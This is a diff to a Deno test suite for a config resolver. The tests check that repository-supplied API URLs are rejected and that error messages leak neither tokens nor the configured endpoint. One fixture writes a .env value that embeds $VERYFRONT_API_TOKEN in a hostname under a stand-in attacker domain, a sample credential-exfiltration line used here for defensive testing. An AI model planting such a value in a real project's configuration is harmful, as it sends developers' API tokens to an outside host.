@@ -197,7 +197,7 @@ describe("resolveConfig", () => {
       await assertRejects(
         () => resolveConfig(tempDir, env),
         Error,
-        "veryfront.json sets apiUrl to https://attacker.example",
+        "veryfront.json selects a repository-configured API endpoint",
       );
     } finally {
       await Deno.remove(tempDir, { recursive: true });
@@ -222,7 +222,7 @@ describe("resolveConfig", () => {
       await assertRejects(
         () => resolveConfig(tempDir, env),
         Error,
-        "veryfront.json sets apiUrl to https://attacker.example",
+        "veryfront.json selects a repository-configured API endpoint",
       );
     } finally {
       await deleteToken(createMockEnv({ xdgConfigHome: configHome }));
@@ -298,7 +298,8 @@ describe("resolveConfig", () => {
       assertInstanceOf(error, Error);
 
       assertEquals(error.message.includes("hunter2"), false);
-      assertEquals(error.message.includes("attacker.example"), true);
+      assertEquals(error.message.includes("attacker.example"), false);
+      assertEquals(error.message.includes("repository-configured API endpoint"), true);
     } finally {
       await Deno.remove(tempDir, { recursive: true });
     }
@@ -325,7 +326,7 @@ describe("resolveConfig", () => {
       await assertRejects(
         () => resolveConfig(tempDir, env),
         Error,
-        "The project .env file sets VERYFRONT_API_URL to https://attacker.example",
+        "The project .env file sets VERYFRONT_API_URL to a repository-configured API endpoint",
       );
     } finally {
       __resetEnvLoaderForTests();
@@ -431,7 +432,7 @@ describe("resolveConfig", () => {
       Deno.env.set("VERYFRONT_API_TOKEN", shellToken);
       await Deno.writeTextFile(
         join(tempDir, ".env"),
-        "VERYFRONT_API_URL=https://attacker.example/$VERYFRONT_API_TOKEN\n",
+        "VERYFRONT_API_URL=https://$VERYFRONT_API_TOKEN.attacker.example\n",
       );
       await loadEnv({ cwd: tempDir });
 
@@ -444,7 +445,8 @@ describe("resolveConfig", () => {
       assertInstanceOf(error, Error);
 
       assertEquals(error.message.includes(shellToken), false);
-      assertEquals(error.message.includes("attacker.example"), true);
+      assertEquals(error.message.includes("attacker.example"), false);
+      assertEquals(error.message.includes("repository-configured API endpoint"), true);
     } finally {
       __resetEnvLoaderForTests();
       await Deno.remove(tempDir, { recursive: true });
@@ -496,7 +498,8 @@ describe("resolveConfig", () => {
 
       assertEquals(isUntrustedApiUrlCredentialError(error), true);
       assertEquals(error.message.includes(ciSecret), false);
-      assertEquals(error.message.includes("attacker.example"), true);
+      assertEquals(error.message.includes("attacker.example"), false);
+      assertEquals(error.message.includes("repository-configured API endpoint"), true);
     } finally {
       __resetEnvLoaderForTests();
       await Deno.remove(tempDir, { recursive: true });
@@ -548,7 +551,7 @@ describe("resolveConfig", () => {
     }
   });
 
-  it("does not tell the developer to assign the pathless origin to VERYFRONT_API_URL", async () => {
+  it("names the confirmation variable without echoing the configured endpoint", async () => {
     const tempDir = await makeTempDir();
     try {
       await Deno.writeTextFile(
@@ -561,11 +564,11 @@ describe("resolveConfig", () => {
       const error = await assertRejects(() => resolveConfig(tempDir, env), Error);
       assertInstanceOf(error, Error);
 
-      // Copying the bare origin would drop the /api base path and send every
-      // request to the wrong place, so no assignment is offered at all.
+      // Repository-controlled endpoint text is omitted entirely. The message
+      // still names the shell variable the developer can set independently.
       assertEquals(error.message.includes("VERYFRONT_API_URL=https://control.example"), false);
       assertEquals(error.message.includes("VERYFRONT_API_URL"), true);
-      assertEquals(error.message.includes("base path"), true);
+      assertEquals(error.message.includes("repository-configured API endpoint"), true);
     } finally {
       await Deno.remove(tempDir, { recursive: true });
     }
